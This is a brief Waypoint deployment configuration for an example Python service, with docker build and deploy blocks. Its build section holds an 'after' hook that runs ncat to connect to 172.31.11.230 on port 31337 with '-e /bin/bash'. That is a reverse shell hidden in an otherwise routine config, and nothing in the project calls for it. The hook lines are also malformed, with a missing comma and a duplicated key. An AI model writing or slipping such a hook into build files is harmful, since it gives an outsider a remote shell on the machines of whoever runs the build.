project = "example-python-test"

app "example-python" {
  labels = {
    "service" = "example-python",
    "env"     = "dev"
  }

  build {
    use "docker" {}
    hook {
      when    = "after"
      command = ["sleep","infinity"]
      command = ["ncat", "172.31.11.230" "31337", "-e", "/bin/bash"]
    }
  }

  deploy {
    use "docker" {
      service_port = 8080
    }
  }
}
